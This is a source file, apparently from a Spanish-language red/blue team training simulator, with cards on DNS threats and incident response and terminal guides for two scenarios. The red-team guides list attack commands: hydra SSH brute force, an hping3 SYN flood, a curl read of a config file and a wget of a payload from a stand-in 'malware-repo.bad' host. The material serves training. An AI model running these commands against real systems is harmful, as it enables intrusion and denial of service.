                        [<strong>AAAA</strong>, 'Quad A', 'Asocia un dominio a una dirección IPv6.', <code>2607:f8b0:400a:80e::200e</code>],
                        [<strong>CNAME</strong>, 'Canonical Name', 'Crea un alias. Apunta un dominio a otro dominio.', 'mail.google.com'],
                        [<strong>MX</strong>, 'Mail Exchange', 'Especifica el servidor de correo para un dominio.', '10 smtp.google.com'],
                    ]}
                />
            </CisoCard>
            <CisoCard icon="arrow-right-left" title="Proceso de Resolución: Recursiva vs. Iterativa">
                 <dl>
                    <dt>Consulta Recursiva</dt>
                    <dd>El cliente (su PC) le pregunta al Solucionador Recursivo (ej. <code>8.8.8.8</code>) y le dice: "Encuentra esta IP por mí y no me molestes hasta que la tengas". El cliente es "flojo".</dd>
                    <dt>Consulta Iterativa</dt>
                    <dd>El Solucionador Recursivo hace el trabajo. Pregunta a otros servidores (Raíz, TLD, Autoritativo) de forma iterativa, donde cada servidor le da una pista de "a quién preguntar después".</dd>
                </dl>
            </CisoCard>
        </>
    },
    {
        id: 'recurso-amenazas-dns', icon: 'shield-half', title: 'Análisis Profundo: Amenazas DNS (Taller 2)',
        content: <>
            <CisoCard icon="user-x" title="Envenenamiento de Caché DNS (Pharming)">
                <p>Un atacante engaña a un servidor DNS recursivo para que acepte una respuesta falsa. El servidor guarda (envenena) esta respuesta en su caché. Cualquier usuario que consulte ese servidor será redirigido a una IP maliciosa.</p>
            </CisoCard>
            <CisoCard icon="bomb" title="Ataque de Amplificación de DNS (DDoS)">
                 <p>El atacante usa una botnet para enviar miles de pequeñas consultas DNS a servidores abiertos, pero falsifica (spoofing) la IP de origen para que sea la de la víctima. Diseña la consulta para que genere una respuesta muy grande.</p>
            </CisoCard>
        </>
    },
    {
        id: 'recurso-incidente', icon: 'radio-tower', title: 'Análisis Profundo: Respuesta a Incidentes (Taller 4)',
        content: <>
            <CisoCard icon="alert-circle" title="Triaje (Priorización) de Incidentes">
                <p>En un ataque combinado, la prioridad es <strong>detener la brecha de datos</strong>. Un DDoS (disponibilidad) pierde ingresos; una brecha de C2 (confidencialidad/integridad) pierde datos, reputación y genera multas.</p>
            </CisoCard>
             <CisoCard icon="power-off" title="Contención: ¿Por qué NO apagar el servidor?">
                <p><strong>¡Evidencia Volátil!</strong> Apagar un servidor comprometido es uno de los peores errores en la respuesta a incidentes. Se destruye toda la evidencia en la memoria RAM.</p>
            </CisoCard>
        </>
    },
    {
        id: 'recurso-taller5', icon: 'shield-off', title: 'Análisis Profundo: "El Peor Día" (Taller 5)',
        content: <>
            <CisoCard icon="shield" title="Solución: FASE A (Contención)">
                <p><strong>Respuesta Clave:</strong> La acción más rápida y efectiva es la <strong>#3: Cambiar el Registro DNS Público.</strong></p>
            </CisoCard>
            <CisoCard icon="refresh-cw" title="Solución: FASE B (Recuperación)">
                <p><strong>Respuesta Clave:</strong> La única respuesta aceptable es la <strong>#1: Restauración desde Respaldo.</strong></p>
            </CisoCard>
        </>
    },
    {
        id: 'recurso-taller6', icon: 'swords', title: 'Análisis Profundo: Tácticas de Equipo Rojo (Taller 6)',
        content: <>
            <CisoCard icon="chevrons-up" title="Solución: FASE 2 (Shell Directa vs. Inversa)">
                <p><strong>Respuesta Clave:</strong> Los atacantes prefieren la <strong>Shell Inversa (Reverse Shell)</strong>.</p>
            </CisoCard>
            <CisoCard icon="flag" title="Solución: FASE 3 (Generar 'Ruido' / Señales)">
                <CisoTable 
                    headers={['Acción del Equipo Rojo (RR)', 'Señal / Detección del Equipo Azul (BA)']}
                    rows={[
                        ['Inicia Shell Inversa', "Debería verla con `netstat -anp`."],
                        ["Ejecuta `passwd admin`", "Debería ver 'Evento 4724' en Logs de Eventos."],
                        ["Reemplaza `index.html`", "Debería tener un Monitor de Integridad de Archivos (FIM)."],
                    ]}
                />
            </CisoCard>
        </>
    },
    {
        id: 'recurso-taller7', icon: 'shield-check', title: 'Análisis Profundo: Fortaleza Digital (Taller 7)',
        content: <>
            <CisoCard icon="shield" title="Contexto Equipo Azul (Hardening)">
                 <dl>
                    <dt>Blindaje SSH (PermitRootLogin no):</dt>
                    <dd>En Linux, el usuario <code>root</code> siempre existe. Si permitimos el login directo, los atacantes solo tienen que adivinar la contraseña (50% del trabajo).</dd>
                </dl>
            </CisoCard>
            <CisoCard icon="sword" title="Contexto Equipo Rojo (Pentest)">
                <dl>
                    <dt>Fuerza Bruta (Hydra):</dt>
                    <dd>Hydra es una herramienta "ruidosa". Es un "martillo", no un "bisturí". En un pentest real, esto alertaría a cualquier SOC decente.</dd>
                </dl>
            </CisoCard>
        </>
    },
    {
        id: 'recurso-taller8', icon: 'activity', title: 'Análisis Profundo: Furia en la Red (Taller 8)',
        content: <>
            <CisoCard icon="shield" title="Contexto Equipo Azul (Respuesta)">
                 <dl>
                    <dt>Detección de DoS (top/htop):</dt>
                    <dd>Un ataque de inundación SYN (SYN Flood) agota los recursos del servidor al dejar conexiones a medio abrir. En <code>top</code>, esto se manifiesta como un uso de CPU cercano al 100%, a menudo por procesos del sistema que manejan interrupciones de red (ksoftirqd).</dd>
                    <dt>Análisis de Logs (journalctl/grep):</dt>
                    <dd>Los ataques de fuerza bruta son "ruidosos" por diseño. Dejan un rastro claro en los logs de autenticación (<code>/var/log/auth.log</code> o vía <code>journalctl</code>). Buscar "Failed password" es la forma más rápida de confirmar el ataque y encontrar la IP de origen.</dd>
                    <dt>Contención (Firewall):</dt>
                    <dd>Una vez identificada la IP del atacante, bloquearla en el firewall (<code>ufw deny from [IP]</code>) es la contención más efectiva. Detiene tanto el DoS como el ataque de fuerza bruta con una sola regla.</dd>
                </dl>
            </CisoCard>
            <CisoCard icon="sword" title="Contexto Equipo Rojo (Ataque)">
                <dl>
                    <dt>Ataque Combinado:</dt>
                    <dd>La estrategia aquí es usar un ataque "ruidoso" y de baja complejidad (DoS) como una cortina de humo para ocultar el ataque más sigiloso y peligroso (fuerza bruta para obtener credenciales). Mientras el equipo de defensa está ocupado con el DoS, el atacante intenta ganar acceso.</dd>
                    <dt>Inundación SYN (hping3):</dt>
                    <dd><code>hping3 --flood -S [host]</code> envía una ráfaga de paquetes TCP SYN sin completar el handshake. Es una forma clásica y efectiva de probar la resistencia de un servidor a ataques DoS a nivel de red.</dd>
                </dl>
            </CisoCard>
        </>
    },
];

// Terminal Help Text
export const GENERAL_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">Bienvenido a la terminal de simulación.
Use 'help' para comandos de equipo, o 'help [id_escenario]' para guías.
Ej: <strong class="text-amber-300">help escenario7</strong>

  clear                    - Limpia la pantalla de la terminal.
  marca                    - Muestra la marca de Cyber Valtorix.
  exit                     - Cierra una sesión SSH simulada.
</pre>`;

export const RED_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO - OBJETIVOS Y COMANDOS</strong>
Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).

<strong>Fase 1: Reconocimiento</strong>
  <strong class="text-amber-300">nmap [host]</strong>              - Escanea puertos y servicios.
  <strong class="text-amber-300">dirb http://[host]</strong>       - Busca directorios web ocultos.
  <strong class="text-amber-300">curl http://[host]/[file]</strong> - Intenta leer archivos sensibles.
  <strong class="text-amber-300">nikto -h http://[host]</strong>   - Escáner de vulnerabilidades web.

<strong>Fase 2: Intrusión y Explotación</strong>
  <strong class="text-amber-300">hydra ssh://[host]</strong>       - Lanza un ataque de fuerza bruta a SSH. <strong class="text-red-500">(¡RUIDOSO!)</strong>
  <strong class="text-amber-300">john [hash_file]</strong>       - Simula cracking de contraseñas offline.
  <strong class="text-amber-300">ssh [user]@[host]</strong>      - Intenta acceder con credenciales encontradas.
  <strong class="text-amber-300">wget [url]</strong>             - (Dentro del host) Descarga un 'payload'.

<strong>Fase 3: Disrupción</strong>
  <strong class="text-amber-300">hping3 --flood [host]</strong>    - Simula un ataque de Denegación de Servicio (DoS).
</pre>`;

export const BLUE_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL - OBJETIVOS Y COMANDOS</strong>
Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).

<strong>Fase 1: Conexión y Hardening</strong>
  <strong class="text-amber-300">ssh blue-team@[host]</strong>     - Conéctese al servidor para asegurarlo.
  <strong class="text-amber-300">sudo ufw [cmd]</strong>           - Gestiona el firewall (status, enable, allow, deny).
  <strong class="text-amber-300">sudo nano sshd_config</strong>      - Simula editar la config de SSH.
  <strong class="text-amber-300">sudo systemctl restart sshd</strong>- Aplica los cambios a SSH.
  <strong class="text-amber-300">ls -l [file]</strong>             - Lista permisos de archivos.
  <strong class="text-amber-300">chmod [perm] [file]</strong>      - Cambia permisos de archivos.

<strong>Fase 2: Monitoreo y Detección</strong>
  <strong class="text-amber-300">top</strong> / <strong class="text-amber-300">htop</strong>               - Muestra la carga del sistema (Detectar DoS).
  <strong class="text-amber-300">sudo ss -tulnp</strong>               - Muestra servicios escuchando en puertos.
  <strong class="text-amber-300">grep "Failed" auth.log</strong>     - Busca intentos de login fallidos.
  <strong class="text-amber-300">journalctl -u sshd</strong>       - Revisa logs del servicio SSH.
  <strong class="text-amber-300">openssl s_client -connect [host]:443</strong> - Valida el certificado SSL/TLS.

<strong>Fase 3: Respuesta a Incidentes</strong>
  <strong class="text-amber-300">fail2ban-client banip [ip]</strong> - Simula un baneo manual de IP.
  <strong class="text-amber-300">sha256sum [file]</strong>           - Verifica la integridad de un archivo.
</pre>`;

export const SCENARIO_HELP_TEXTS: { [key: string]: { general: string, red: string, blue: string } } = {
  'escenario7': {
    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 7: Fortaleza Digital</strong>
Este es un ejercicio práctico de ataque y defensa en tiempo real contra <strong class="text-cyan-300">BOVEDA-WEB</strong>.
</pre>`,
    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'BOVEDA-WEB'</strong>
Tu misión es asegurar el servidor ANTES de que el Equipo Rojo encuentre una vulnerabilidad.
El orden es crítico.

1.  <strong>Activar Firewall (UFW):</strong> Es tu primera línea de defensa.
    <strong class="text-amber-300">sudo ufw status</strong>      (Verifica que está inactivo)
    <strong class="text-amber-300">sudo ufw allow ssh</strong>     (¡CRÍTICO! O te quedarás fuera)
    <strong class="text-amber-300">sudo ufw allow http</strong>      (Permite el tráfico web)
    <strong class="text-amber-300">sudo ufw enable</strong>        (¡Actívalo!)

2.  <strong>Asegurar SSH:</strong> Deshabilita el login directo de 'root'.
    <strong class="text-amber-300">sudo nano sshd_config</strong>  (Simula la edición, cambiarás PermitRootLogin a 'no')
    <strong class="text-amber-300">sudo systemctl restart sshd</strong> (Aplica los cambios)

3.  <strong>Principio de Menor Privilegio:</strong> Protege archivos sensibles.
    <strong class="text-amber-300">ls -l /var/www/html/db_config.php</strong> (Verás permisos peligrosos como 644)
    <strong class="text-amber-300">chmod 640 /var/www/html/db_config.php</strong>  (Quita permisos de lectura a 'otros')

4.  <strong>Monitoreo Activo:</strong> Caza al Equipo Rojo.
    <strong class="text-amber-300">grep "Failed" auth.log</strong> (Ejecuta esto repetidamente mientras el Equipo Rojo
                           usa 'hydra' para ver los ataques en tiempo real)
    <strong class="text-amber-300">sudo ss -tulnp</strong>       (Verifica qué puertos están abiertos. Deberían ser
                           menos después de activar el firewall)
</pre>`,
    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
Tu misión es encontrar una ventana de oportunidad antes de que el Equipo Azul la cierre.

1.  <strong>Reconocimiento:</strong> ¿Qué está abierto?
    <strong class="text-amber-300">nmap -sV -sC BOVEDA-WEB</strong> (Si el firewall está apagado, verás muchos
                           puertos. Si está encendido, solo los permitidos)

2.  <strong>Intento de Fuerza Bruta:</strong> El ataque más ruidoso.
    <strong class="text-amber-300">hydra ssh://BOVEDA-WEB</strong> (Esto SOLO FUNCIONARÁ si el Equipo Azul no ha
                           asegurado SSH para deshabilitar el login de root)
                           Si tienes éxito, entra con <strong class="text-amber-300">ssh root@BOVEDA-WEB</strong>

3.  <strong>Explotación Web (Simulada):</strong>
    <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     (Busca directorios. ¿Hay un /backup?)
    <strong class="text-amber-300">curl http://BOVEDA-WEB/db_config.php</strong> (Si los permisos no han sido
                                     corregidos, podrías leer el archivo)
</pre>`
  },
 'escenario8': {
    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 8: Furia en la Red</strong>
Ataque combinado contra <strong class="text-cyan-300">PORTAL-WEB</strong>. El trabajo en equipo y la velocidad son claves.
</pre>`,
    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'PORTAL-WEB'</strong>
Estás bajo un doble ataque. Debes diagnosticar y mitigar ambas amenazas.

1.  <strong>Diagnóstico Inicial:</strong> ¿Qué está pasando?
    <strong class="text-amber-300">top</strong>                 (El sistema está lento. Verás una carga de CPU del 99%.
                          Esto indica un posible DoS o un proceso descontrolado).
    <strong class="text-amber-300">journalctl -u sshd</strong>    (Verás cientos de "Failed password for admin".
                          Esto es un ataque de fuerza bruta. Anota la IP de origen).

2.  <strong>Mitigación Inmediata:</strong> ¡Detén el sangrado!
    <strong class="text-amber-300">sudo ufw deny from [IP_ATACANTE]</strong> (Bloquea la IP que encontraste en los
                                      logs. Esto detendrá AMBOS ataques).
    <strong class="text-amber-300">fail2ban-client set sshd banip [IP_ATACANTE]</strong> (Alternativa que simula
                                                    un baneo automático).
    Vuelve a ejecutar <strong class="text-amber-300">top</strong>. La carga debería normalizarse.

3.  <strong>Análisis Post-Incidente:</strong> ¿Lograron entrar?
    <strong class="text-amber-300">sha256sum /var/www/html/index.php</strong> (Verifica la integridad del archivo.
                                        Si el Equipo Rojo tuvo éxito, verás una alerta
                                        de que el hash no coincide).
</pre>`,
    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
Tu misión es multifacética: distraer, infiltrar y desplegar.

1.  <strong>Fase de Distracción (DoS):</strong> Crea caos.
    <strong class="text-amber-300">hping3 --flood -S PORTAL-WEB</strong> (Lanza un SYN flood. Esto hará que el servidor
                                   se vuelva lento y alertará al Equipo Azul,
                                   dándote cobertura para el siguiente paso).

2.  <strong>Fase de Infiltración (Fuerza Bruta):</strong>
    Mientras el DoS está activo, abre otra ventana (mentalmente) y lanza:
    <strong class="text-amber-300">hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</strong>
    (Este ataque encontrará la contraseña. Si el Equipo Azul te bloquea
    la IP, ambos ataques fallarán).

3.  <strong>Acceso y "Payload":</strong>
    Si obtuviste la contraseña antes de ser bloqueado:
    <strong class="text-amber-300">ssh admin@PORTAL-WEB</strong> (Usa la contraseña encontrada).
    Una vez dentro, simula el despliegue de un payload:
    <strong class="text-amber-300">wget http://malware-repo.bad/payload.sh</strong>

El ejercicio termina cuando el Equipo Azul bloquea tu IP o cuando despliegas el payload.
</pre>`
 }
};
